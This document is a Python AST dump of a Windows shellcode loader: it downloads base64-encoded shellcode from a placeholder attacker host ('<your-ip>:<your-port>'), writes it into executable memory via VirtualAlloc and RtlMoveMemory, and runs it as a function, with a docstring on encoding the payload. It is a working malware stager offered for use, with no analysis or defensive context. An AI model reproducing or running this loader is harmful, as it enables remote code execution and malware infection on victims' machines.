"Module(body=[ImportFrom(module='urllib', names=[alias(name='request')], level=0), Import(names=[alias(name='base64')]), Import(names=[alias(name='ctypes')]), Assign(targets=[Name(id='kernel32', ctx=Store())], value=Attribute(value=Attribute(value=Name(id='ctypes', ctx=Load()), attr='windll', ctx=Load()), attr='kernel32', ctx=Load())), FunctionDef(name='get_code', args=arguments(posonlyargs=[], args=[arg(arg='url')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[With(items=[withitem(context_expr=Call(func=Attribute(value=Name(id='request', ctx=Load()), attr='urlopen', ctx=Load()), args=[Name(id='url', ctx=Load())], keywords=[]), optional_vars=Name(id='response', ctx=Store()))], body=[Assign(targets=[Name(id='shellcode', ctx=Store())], value=Call(func=Attribute(value=Name(id='base64', ctx=Load()), attr='decodebytes', ctx=Load()), args=[Call(func=Attribute(value=Name(id='response', ctx=Load()), attr='read', ctx=Load()), args=[], keywords=[])], keywords=[]))]), Return(value=Name(id='shellcode', ctx=Load()))], decorator_list=[]), FunctionDef(name='write_memory', args=arguments(posonlyargs=[], args=[arg(arg='buf')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Expr(value=Constant(value='Writes the buffer into memory')), Assign(targets=[Name(id='length', ctx=Store())], value=Call(func=Name(id='len', ctx=Load()), args=[Name(id='buf', ctx=Load())], keywords=[])), Assign(targets=[Attribute(value=Attribute(value=Name(id='kernel32', ctx=Load()), attr='VirtualAlloc', ctx=Load()), attr='restype', ctx=Store())], value=Attribute(value=Name(id='ctypes', ctx=Load()), attr='c_void_p', ctx=Load())), Assign(targets=[Attribute(value=Attribute(value=Name(id='kernel32', ctx=Load()), attr='RtlMoveMemory', ctx=Load()), attr='argtypes', ctx=Store())], value=Tuple(elts=[Attribute(value=Name(id='ctypes', ctx=Load()), attr='c_void_p', ctx=Load()), Attribute(value=Name(id='ctypes', ctx=Load()), attr='c_void_p', ctx=Load()), Attribute(value=Name(id='ctypes', ctx=Load()), attr='c_size_t', ctx=Load())], ctx=Load())), Assign(targets=[Name(id='ptr', ctx=Store())], value=Call(func=Attribute(value=Name(id='kernel32', ctx=Load()), attr='VirtualAlloc', ctx=Load()), args=[Constant(value=None), Name(id='length', ctx=Load()), Constant(value=12288), Constant(value=64)], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='kernel32', ctx=Load()), attr='RtlMoveMemory', ctx=Load()), args=[Name(id='ptr', ctx=Load()), Name(id='buf', ctx=Load()), Name(id='length', ctx=Load())], keywords=[])), Return(value=Name(id='ptr', ctx=Load()))], decorator_list=[]), FunctionDef(name='run', args=arguments(posonlyargs=[], args=[arg(arg='sellcode')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Assign(targets=[Name(id='buffer', ctx=Store())], value=Call(func=Attribute(value=Name(id='ctypes', ctx=Load()), attr='create_string_buffer', ctx=Load()), args=[Name(id='shellcode', ctx=Load())], keywords=[])), Assign(targets=[Name(id='ptr', ctx=Store())], value=Call(func=Name(id='write_memory', ctx=Load()), args=[Name(id='buffer', ctx=Load())], keywords=[])), Assign(targets=[Name(id='shell_func', ctx=Store())], value=Call(func=Attribute(value=Name(id='ctypes', ctx=Load()), attr='cast', ctx=Load()), args=[Name(id='ptr', ctx=Load()), Call(func=Attribute(value=Name(id='ctypes', ctx=Load()), attr='CFUNCTYPE', ctx=Load()), args=[Constant(value=None)], keywords=[])], keywords=[])), Expr(value=Call(func=Name(id='shell_func', ctx=Load()), args=[], keywords=[]))], decorator_list=[]), If(test=Compare(left=Name(id='__name__', ctx=Load()), ops=[Eq()], comparators=[Constant(value='__main__')]), body=[Expr(value=Constant(value=' To base64 encode your code, use the following command: \\n        $ base64 -w 0 -i myshellcode.raw > myshellcode.bin ')), Assign(targets=[Name(id='url', ctx=Store())], value=Constant(value='http://<your-ip>:<your-port>/shellcode.bin')), Assign(targets=[Name(id='shellcode', ctx=Store())], value=Call(func=Name(id='get_code', ctx=Load()), args=[Name(id='url', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='run', ctx=Load()), args=[Name(id='shellcode', ctx=Load())], keywords=[]))], orelse=[])], type_ignores=[])"